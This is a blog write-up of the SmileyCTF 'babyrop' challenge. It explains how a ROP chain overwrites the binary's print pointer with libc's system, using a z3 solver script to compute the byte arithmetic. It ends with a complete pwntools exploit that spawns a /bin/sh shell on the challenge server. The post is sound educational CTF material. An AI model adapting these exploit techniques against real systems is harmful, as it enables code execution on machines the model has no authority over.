---
title: "SmileyCTF babyrop Writeup"
date: 2025-07-23 18:00:00 +0000
layout: post
categories: [CTF, Writeup, SmileyCTF, babyrop]
tags: [smileyctf, pwn, rop, return-oriented-programming, linux-binary-exploitation, binary-exploitation, buffer-overflow, stack-based-buffer-overflow, python, c, pwntools, gef]
description: "Reverse engineering and pwning the SmileyCTF Babyrop challenge binary. Includes GOT overwrite with limited rop gadgets"
image: "/assets/images/SmileyCTF-babyrop/smileyCTF_pic.png"
---

This blog post is about the another way to achieve code execution on `SmileyCTF - babyrop challange` . After the CTF ended,  encountered strange solution. It makes me wonder. So i decided to re-produce to steps. 

## The Game Plan

Let me explain quickly, the `vuln` binary using `print` function from `libc.so.6` . The address 0x404010 . ^address-of-print

![[63d7bce5910a2d478793a53f44079a65.png]]


When we looked at the which memory region `print` function address located in `rw` region (**.data**). 

![9475169ebea7cf0520a5591149a8ffeb.png](/assets/images/SmileyCTF-babyrop/9475169ebea7cf0520a5591149a8ffeb.png)

The `GOT Table` in read-only area but `print` in `.data` section.

![b1aaec7d96488891656802b329ca7c90.png](/assets/images/SmileyCTF-babyrop/b1aaec7d96488891656802b329ca7c90.png)

The [First Writeup](https://ismailbozkurt.github.io/ctf/writeup/2025/07/17/SmileyCTF_Babyrop.html) has same idea with the libc-leak, stack pivoting approach with `ROP chain` . This approach answering this particular question. 

**`What happens if we set address inside of 0x404010 with execve, system or one_gadget without leaking libc`** .   GOT overwrite essentially.

Since we have already have `libc.so.6` file. So the knowledge of offsets already known to us. All we have to find proper way to set address inside of `0x404010` .

Sounds like a plan right ? Lets move into it.

### Revisiting the gadgets

The challange creator/creators give us these gadgets. This gadgets will have crucial roles for the `ROP Chain` . ^gadgets-function

```python
gef➤  disassemble gadgets 
Dump of assembler code for function gadgets:
   0x0000000000401176 <+0>:     endbr64
   0x000000000040117a <+4>:     push   rbp
   0x000000000040117b <+5>:     mov    rbp,rsp
   0x000000000040117e <+8>:     pop    rcx
   0x000000000040117f <+9>:     ret
   0x0000000000401180 <+10>:    nop
   0x0000000000401181 <+11>:    pop    rbp
   0x0000000000401182 <+12>:    ret
End of assembler dump.
```

```bash
ropr ./vuln -j -u 
```


The important gadgets for the plan.

```python
0x00401157: add eax, 0x2ec3; add [rbp-0x3d], ebx; nop; ret;
0x0040115c: add [rbp-0x3d], ebx; nop; ret;
0x0040115b: add [rcx], al; pop rbp; ret;
0x00401230: add rsp, 8; ret;
0x0040117a: push rbp; mov rbp, rsp; pop rcx; ret;
0x0040117b: mov rbp, rsp; pop rcx; ret;
0x0040117e: pop rcx; ret;
0x00401181: pop rbp; ret;
0x00401234: ret;
```

### LIBC Harvesting


There are 2 specific gadgets that let us ability to put any value we want. Anything we put on stack these gadgets let us to handle directly.

![67dd8f932a117f348c2fd4bc807c5acb.png](/assets/images/SmileyCTF-babyrop/67dd8f932a117f348c2fd4bc807c5acb.png)


Another probably the most important one is the `0x40115c`  If we control `ebx` register value we control any value inside of `$rbp-0x3d` 

![d59cc8f546e7467c0dec46bdfd5e247d.png](/assets/images/SmileyCTF-babyrop/d59cc8f546e7467c0dec46bdfd5e247d.png)

Now imagine^imagination

```python
(remote) gef➤  p puts
$3 = {int (const char *)} 0x7ffff7e32be0 <__GI__IO_puts>
(remote) gef➤  p system
$4 = {int (const char *)} 0x7ffff7e03750 <__libc_system>
(remote) gef➤  p puts-system
$5 = 0x2f490
(remote) gef➤  p system-puts
$6 = 0xfffffffffffd0b70
```

>rbp : 0x40404d-> the print GOT address at 0x404010 (0x7ffff7e32be0 in my environment)
>ebx : 0xfffffffffffd0b70
> The result inside of 0x404010 -> 0x7ffff7e03750

The end of calculations successfully overwrite the 0x404010 with `__libc_system` address.
Nothing easy in life, this gonna be not so easy as well.

As you realize didn't shared any gadget we can control rbx value. Thats because couldn't find any proper gadget with least cost. I'm saying i couldn't because i am not sure if there is, i didn't recognize.

Anyway, there is no simple explanation for this, we need to find and calculate `pop rbx` gadget. The harvesting LIBC was not easy to me, you will see the reason at next steps. So this is our target address. ^e2ee21-addr

```python
(remote) gef➤  x/12i 0x00007ffff7e2ee21
   0x7ffff7e2ee21 <__parse_one_specmb+1057>:    add    rsp,0x18
   0x7ffff7e2ee25 <__parse_one_specmb+1061>:    mov    rax,r14
   0x7ffff7e2ee28 <__parse_one_specmb+1064>:    pop    rbx
   0x7ffff7e2ee29 <__parse_one_specmb+1065>:    pop    r12
   0x7ffff7e2ee2b <__parse_one_specmb+1067>:    pop    r13
   0x7ffff7e2ee2d <__parse_one_specmb+1069>:    pop    r14
   0x7ffff7e2ee2f <__parse_one_specmb+1071>:    pop    r15
   0x7ffff7e2ee31 <__parse_one_specmb+1073>:    pop    rbp
   0x7ffff7e2ee32 <__parse_one_specmb+1074>:    ret
```


If everything goes well and execute 0x7ffff7e2ee21 address, the ebx could be anything we want.

### Headache part

There is one specific problem that gave me so much headache at the start. The gadgets already limited and specific. So the calculations must be precise. What i am saying like this,

> eax could be only 0x2ec3 * n -> n the counter
>> (0x00401157: add eax, 0x2ec3; add [rbp-0x3d], ebx; nop; ret;)
>
>we can only use and add of least significant bit of eax which is al
>>0x0040115b: add [rcx], al; pop rbp; ret; -> this one costy. Everytime this one cost us 16 bytes. its popping rbp.
>
>Somehow we have to end up with  0x7ffff7e2ee21


I don't know the original PoC creator how calculated this but i developed a lazy script that made me the calculation for each individual byte. The script is not great but it does the job.

I also have to mention the other problem as you know, stack is not limitless, oversized payload buffer cause the `Segmentation Fault!` . Even the below one is so close. 

The script

```python
from z3 import *

# Define initial state values
initial_eax = 0x0
#initial_memory_rcx = 0x7ffff7e32be0 # print libc address
#initial_memory_rcx = 0x7ffff7e32b2b # 17 eax, 30 rcx
initial_memory_rcx  = 0x7ffff7e32b2b

# Define the target RL byte
#target_rl = 0x2b # Or 0x21 based on your example
#target_rl = 0xa5 # Or 0x21 based on your example
target_rl  = 0xee
# Global counters for function executions (for Python verification)
executed_functions = []

# --- Python Helper Functions (as before) ---
# Simulate memory as a dictionary
memory = {}
rcx = 0x404010

def add_eax_2ec3(eax_val: int) -> int:
    global executed_functions
    executed_functions.append("add_eax_2ec3")
    return eax_val + 0x2ec3

def get_al(eax_val: int) -> int:
    return eax_val & 0xff

def add_al_to_rl(eax_val: int, rcx_addr: int):
    global executed_functions
    executed_functions.append("add_al_to_rl")
    if rcx_addr not in memory:
        print(f"Error: Address {hex(rcx_addr)} not found in memory.")
        return
    al = get_al(eax_val)
    current_memory_val = memory[rcx_addr]
    current_rl = current_memory_val & 0xff
    new_rl = (current_rl + al) & 0xff
    memory[rcx_addr] = (current_memory_val & ~0xff) | new_rl

# --- Z3 Solver Logic (Revised for Multiple AL Adds) ---
s = Optimize()

# Z3 variables
num_eax_adds_bv = BitVec('num_eax_adds_bv', 64) # Number of add_eax_2ec3 calls
num_al_adds_bv = BitVec('num_al_adds_bv', 64)   # Number of add_al_to_rl calls
final_eax_at_loop_start_z3 = BitVec('final_eax_at_loop_start', 64) # eax after all add_eax_2ec3 calls
current_rl_z3 = BitVec('current_rl', 8)         # Initial RL of memory[rcx]

# Constraints:
# 1. Number of calls must be non-negative
s.add(num_eax_adds_bv >= 0)
s.add(num_al_adds_bv >= 0) # Must call add_al_to_rl at least once to change RL

# 2. final_eax_at_loop_start_z3 is derived from initial_eax by num_eax_adds_bv calls
s.add(final_eax_at_loop_start_z3 == BitVecVal(initial_eax, 64) + (num_eax_adds_bv * BitVecVal(0x2ec3, 64)))

# 3. Initial RL from memory[rcx]
s.add(current_rl_z3 == (initial_memory_rcx & 0xFF))

# 4. Get AL from final_eax_at_loop_start_z3 (this AL is used repeatedly)
al_z3 = Extract(7, 0, final_eax_at_loop_start_z3)

# 5. Calculate the cumulative sum of AL additions to RL
#    new_rl = (initial_rl + (num_al_adds * al)) & 0xFF
cumulative_al_sum_z3_8bit = Extract(7, 0, (num_al_adds_bv * ZeroExt(56, al_z3)))

# Now add two 8-bit BitVecs
final_rl_z3 = (current_rl_z3 + cumulative_al_sum_z3_8bit) & 0xFF

# 6. The final RL must be the target RL
s.add(final_rl_z3 == target_rl)

# --- Optimization Objective ---
# Minimize the total number of operations, or prioritize one over the other
# Let's minimize the sum of eax adds and al adds (total steps)
s.minimize(num_eax_adds_bv + num_al_adds_bv)
# Or, if you prioritize fewer add_al_to_rl calls:
# s.minimize(num_al_adds_bv)
# s.minimize(num_eax_adds_bv) # Then minimize eax_adds secondary (can chain minimizes)


# Find a solution
if s.check() == sat:
    model = s.model()
    found_num_eax_adds = model[num_eax_adds_bv].as_long()
    found_num_al_adds = model[num_al_adds_bv].as_long()
    found_final_eax_val_at_loop_start = model[final_eax_at_loop_start_z3].as_long()

    print(f"Z3 found an OPTIMIZED solution:")
    print(f"  Minimum 'add_eax_2ec3' calls before loop: {found_num_eax_adds}")
    print(f"  Minimum 'add_al_to_rl' calls: {found_num_al_adds}")
    print(f"  eax value when add_al_to_rl loop starts: {hex(found_final_eax_val_at_loop_start)}")
    print(f"  AL used during loop: {hex(get_al(found_final_eax_val_at_loop_start))}")


    # --- Verification and Execution Count ---
    print("\n--- Verification and Execution Count ---")
    
    # Reset executed functions list for a clean count during verification
    executed_functions = [] 

    # Set up the memory for verification
    eax_for_verification = initial_eax
    memory[rcx] = initial_memory_rcx

    print(f"Initial eax: {hex(eax_for_verification)}")
    print(f"Initial memory[{hex(rcx)}] RL: {hex(memory[rcx] & 0xFF)}")

    # Execute add_eax_2ec3 the found number of times
    for _ in range(found_num_eax_adds):
        eax_for_verification = add_eax_2ec3(eax_for_verification)
    print(f"eax after {found_num_eax_adds} 'add_eax_2ec3' calls: {hex(eax_for_verification)}")
    print(f"AL from this eax: {hex(get_al(eax_for_verification))}")

    # Execute add_al_to_rl the found number of times
    for _ in range(found_num_al_adds):
        add_al_to_rl(eax_for_verification, rcx) # Pass the same eax_for_verification
        
    print(f"\nFinal memory[{hex(rcx)}] RL: {hex(memory[rcx] & 0xFF)}")
    if (memory[rcx] & 0xFF) == target_rl:
        print("Verification successful: RL changed to 0x2b! 🎉")
    else:
        print("Verification failed. 🐞")

    # Print the execution count
    print("\n--- Function Execution Summary ---")
    add_eax_2ec3_count = executed_functions.count("add_eax_2ec3")
    add_al_to_rl_count = executed_functions.count("add_al_to_rl")

    print(f"Executed 'add_eax_2ec3': {add_eax_2ec3_count} time(s)")
    print(f"Executed 'add_al_to_rl': {add_al_to_rl_count} time(s)")
    print(f"Execution order: {executed_functions}")

else:
    print("Z3 could not find a solution.")
```

The calculations like this, 

Current 0x404010 -> 0x7ffff7e32be0
Target   0x404010 -> 0x7ffff7e2ee21

For example,

> eax start value 0, Finds how many times add_eax_0x2ec3 and add_al_to_rl operation should've must for setting specific byte 0x2b to 0xee with order.


Here is the first calculation result.

```bash
root@f12e4e68815a:/host# python3 solver2.py 
Z3 found an OPTIMIZED solution:
  Minimum 'add_eax_2ec3' calls before loop: 1
  Minimum 'add_al_to_rl' calls: 1
  eax value when add_al_to_rl loop starts: 0x2ec3
  AL used during loop: 0xc3

--- Verification and Execution Count ---
Initial eax: 0x0
Initial memory[0x404010] RL: 0x2b
eax after 1 'add_eax_2ec3' calls: 0x2ec3
AL from this eax: 0xc3

Final memory[0x404010] RL: 0xee
Verification successful: RL changed to 0x2b! 🎉

--- Function Execution Summary ---
Executed 'add_eax_2ec3': 1 time(s)
Executed 'add_al_to_rl': 1 time(s)
Execution order: ['add_eax_2ec3', 'add_al_to_rl']
```

After that updating the values inside of script and than re-execute. I'm lazy i know.
The calculations of 0xe0 to 0x21.

```bash
root@f12e4e68815a:/host# python3 solver2.py 
Z3 found an OPTIMIZED solution:
  Minimum 'add_eax_2ec3' calls before loop: 18
  Minimum 'add_al_to_rl' calls: 9
  eax value when add_al_to_rl loop starts: 0x34a79
  AL used during loop: 0x79

--- Verification and Execution Count ---
Initial eax: 0xc3
Initial memory[0x404010] RL: 0xe0
eax after 18 'add_eax_2ec3' calls: 0x34a79
AL from this eax: 0x79

Final memory[0x404010] RL: 0x21
Verification successful: RL changed to 0x2b! 🎉

--- Function Execution Summary ---
Executed 'add_eax_2ec3': 18 time(s)
Executed 'add_al_to_rl': 9 time(s)
Execution order: ['add_eax_2ec3', 'add_eax_2ec3', 'add_eax_2ec3', 'add_eax_2ec3', 'add_eax_2ec3', 'add_eax_2ec3', 'add_eax_2ec3', 'add_eax_2ec3', 'add_eax_2ec3', 'add_eax_2ec3', 'add_eax_2ec3', 'add_eax_2ec3', 'add_eax_2ec3', 'add_eax_2ec3', 'add_eax_2ec3', 'add_eax_2ec3', 'add_eax_2ec3', 'add_eax_2ec3', 'add_al_to_rl', 'add_al_to_rl', 'add_al_to_rl', 'add_al_to_rl', 'add_al_to_rl', 'add_al_to_rl', 'add_al_to_rl', 'add_al_to_rl', 'add_al_to_rl']
```

And the last calculations.

```bash
root@f12e4e68815a:/host# python3 solver2.py 
Z3 found an OPTIMIZED solution:
  Minimum 'add_eax_2ec3' calls before loop: 2
  Minimum 'add_al_to_rl' calls: 1
  eax value when add_al_to_rl loop starts: 0x5dff
  AL used during loop: 0xff

--- Verification and Execution Count ---
Initial eax: 0x79
Initial memory[0x404010] RL: 0xe3
eax after 2 'add_eax_2ec3' calls: 0x5dff
AL from this eax: 0xff

Final memory[0x404010] RL: 0xe2
Verification successful: RL changed to 0x2b! 🎉

--- Function Execution Summary ---
Executed 'add_eax_2ec3': 2 time(s)
Executed 'add_al_to_rl': 1 time(s)
Execution order: ['add_eax_2ec3', 'add_eax_2ec3', 'add_al_to_rl']
```

After each calculations and chaining the gadgets. The result as expected.


![760ad4710464015017e90f8536db37a2.png](/assets/images/SmileyCTF-babyrop/760ad4710464015017e90f8536db37a2.png)

The chain inside PoC. I kept the variable names same with PoC creator.

```python
#...
PUSH_RBP_MOV_RBP_RSP_poprcx = 0x40117a
MOV_RBP_RSP_poprcx = 0x40117b
ADD_EAX_0x2ec3_addrbp0x3debx = 0x401157
ADD_RPBs0x3d_EBX = 0x40115c
ADD_AH_DH = 0x4010b4
ADD_BL_DH = 0x4010bf
POP_RBP = 0x401181
ADD_RSP_8 = 0x401230
RET = 0x401234
POP_RCX = 0x40117e
ADD_BPRCX_AL_poprbp = 0x40115b
MOV_EAX_0_LEAVE = 0x401221

PRINT_CALL = 0x401211

LIBC_POP_RBX = 0x83e21
SYSTEM = 0x58750

writeable = 0x404500

rcxpyld  = p64(ADD_BPRCX_AL_poprbp)
rcxpyld += p64(writeable)

payload = p64(0x5151515151515151)*5
payload += p64(POP_RCX)
payload += p64(0x404011)
payload += p64(POP_RBP)
payload += p64(writeable)
payload += p64(ADD_EAX_0x2ec3_addrbp0x3debx)*1
payload += rcxpyld*1

payload += p64(POP_RCX)
payload += p64(0x404010)
payload += p64(ADD_EAX_0x2ec3_addrbp0x3debx)*18
payload += rcxpyld*9

payload += p64(POP_RCX)
payload += p64(0x404012)
payload += p64(ADD_EAX_0x2ec3_addrbp0x3debx)*2
payload += rcxpyld*1

payload += p64(PRINT_CALL)

log.info(f"total bytes of payload: {len(payload)}")
io.sendline(payload)

#...
```


### Chain-Chin-Cho

So we have now ability to set `ebx` register anything we want. The plan is simple from this point.

Getting offsets `__libc_system and libc_pop_ebx`

```python
(remote) gef➤  p 0x7ffff7e2ee21-0x7ffff7dab000
$1 = 0x83e21
(remote) gef➤  p 0x7ffff7e03750-0x7ffff7dab000
$2 = 0x58750
(remote) gef➤  
```



>The [[02- eth007 - babyrop Challange#^e2ee21-addr|0x0x7ffff7e2ee21]] first instruction `add rsp,0x18` The 2 null bytes for that.
>Set rbx difference between system and libc_pop_rbx
>Set rbp to 0x40404d 


```python
###...
		PRINT_CALL,
        0,
        0,
        SYSTEM-LIBC_POP_RBX, # new rbx
        0, # new r12
        0, # new r13
        0, # new r14
        0, # new r15
        0x404010+0x3d, # new rbp
###...
```


After set rbx and rbp values. Next phase updating the print GOT (0x404010) from 0x0x7ffff7e2ee21 to 0x7ffff7e03750.

> Re- Set rbx difference between system and libc_pop_rbx
> Re- Set rbp to 0x40404d
> Add ebx to RBP 

```python
		PRINT_CALL, # rerun for rax=r14=0
        0,
        0,
        SYSTEM-LIBC_POP_RBX, # new rbx
        0, # new r12
        0, # new r13
        0, # new r14
        0, # new r15
        0x404010+0x3d, # new rbp
        ADD_RPBs0x3d_EBX,
```


![0186a9a56b6c08d15a62f54996ccde77.png](/assets/images/SmileyCTF-babyrop/0186a9a56b6c08d15a62f54996ccde77.png)

The rest is simple. Preparing rbp-0x20 to `/bin/sh\0` and than call the `__libc_system` via print. Since we don't control over the rsi but the content of rsi doesn't bother the execution in this case.


```python
		ADD_RSP_8, # skip over /bin/sh
        0x0068732f6e69622f, # /bin/sh\0
        RET,
        RET,
        MOV_RBP_RSP_poprcx,
        0,
        PRINT_CALL
```

The local execution.

![6d3b50e216927878136aeebe5c9b398e.png](/assets/images/SmileyCTF-babyrop/6d3b50e216927878136aeebe5c9b398e.png)

The remote execution.

![23739a6839bdc16b0b64b93c5b24c371.png](/assets/images/SmileyCTF-babyrop/23739a6839bdc16b0b64b93c5b24c371.png)


The author of this exploit comments about this exploit `mangling rax` which is make sense 

![5ee6285827f4a10addff8eae00581c5e.png](/assets/images/SmileyCTF-babyrop/5ee6285827f4a10addff8eae00581c5e.png)

It was fun and painfull to me, The last exploit i developed like 5 years or smt like that. So it was a good practice. 

The shared PoC code didn't work in my environment, i edited a bit in mine version. Here is the shared PoC code for this challange by the author.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host smiley.cat --port 46657
from pwn import *

context.terminal = ["kitten", "@", "launch", "--type", "tab"]

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'smiley.cat'
port = int(args.PORT or 42447)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc.so.6')
else:
    libc = ELF('libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b main
b *0x0000000000401211
continue
set $tsp=$rsp
define tle
tele $tsp
end
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()

PUSH_RBP_MOV_RBP_RSP_poprcx = 0x40117a
MOV_RBP_RSP_poprcx = 0x40117b
ADD_EAX_0x2ec3_addrbp0x3debx = 0x401157
ADD_RPBs0x3d_EBX = 0x40115c
ADD_AH_DH = 0x4010b4
ADD_BL_DH = 0x4010bf
POP_RBP = 0x401181
ADD_RSP_8 = 0x401230
RET = 0x401234
POP_RCX = 0x40117e
ADD_BPRCX_AL_poprbp = 0x40115b
MOV_EAX_0_LEAVE = 0x401221

PRINT_CALL = 0x401211

LIBC_POP_RBX = 0x83e21
SYSTEM = 0x58750

writeable = 0x404500

payload = flat({
    0x28: [
        POP_RCX,
        0x404011,
        POP_RBP,
        writeable,
        ADD_EAX_0x2ec3_addrbp0x3debx, # al=c3
        ADD_BPRCX_AL_poprbp,
        writeable,
        POP_RCX,
        0x404010,
        ADD_EAX_0x2ec3_addrbp0x3debx,
        ADD_EAX_0x2ec3_addrbp0x3debx,
        ADD_EAX_0x2ec3_addrbp0x3debx,
        ADD_EAX_0x2ec3_addrbp0x3debx,
        ADD_EAX_0x2ec3_addrbp0x3debx,
        ADD_EAX_0x2ec3_addrbp0x3debx,
        ADD_EAX_0x2ec3_addrbp0x3debx,
        ADD_EAX_0x2ec3_addrbp0x3debx,
        ADD_EAX_0x2ec3_addrbp0x3debx,
        ADD_EAX_0x2ec3_addrbp0x3debx,
        ADD_EAX_0x2ec3_addrbp0x3debx,
        ADD_EAX_0x2ec3_addrbp0x3debx,
        ADD_EAX_0x2ec3_addrbp0x3debx,
        ADD_EAX_0x2ec3_addrbp0x3debx,
        ADD_EAX_0x2ec3_addrbp0x3debx,
        ADD_EAX_0x2ec3_addrbp0x3debx,
        ADD_EAX_0x2ec3_addrbp0x3debx,
        ADD_EAX_0x2ec3_addrbp0x3debx,
        ADD_BPRCX_AL_poprbp, writeable,
        ADD_BPRCX_AL_poprbp, writeable,
        ADD_BPRCX_AL_poprbp, writeable,
        ADD_BPRCX_AL_poprbp, writeable,
        ADD_BPRCX_AL_poprbp, writeable,
        ADD_BPRCX_AL_poprbp, writeable,
        ADD_BPRCX_AL_poprbp, writeable,
        ADD_BPRCX_AL_poprbp, writeable,
        ADD_BPRCX_AL_poprbp, writeable,
        PRINT_CALL,
        0,
        0,
        SYSTEM-LIBC_POP_RBX, # new rbx
        0, # new r12
        0, # new r13
        0, # new r14
        0, # new r15
        0x404010+0x3d, # new rbp
        PRINT_CALL, # rerun for rax=r14=0
        0,
        0,
        SYSTEM-LIBC_POP_RBX, # new rbx
        0, # new r12
        0, # new r13
        0, # new r14
        0, # new r15
        0x404010+0x3d, # new rbp
        ADD_RPBs0x3d_EBX,
        ADD_RSP_8, # skip over /bin/sh
        0x0068732f6e69622f, # /bin/sh\0
        RET,
        RET,
        MOV_RBP_RSP_poprcx,
        0,
        PRINT_CALL
        ]
    })
print(len(payload))
io.sendline(payload)

io.interactive()

```

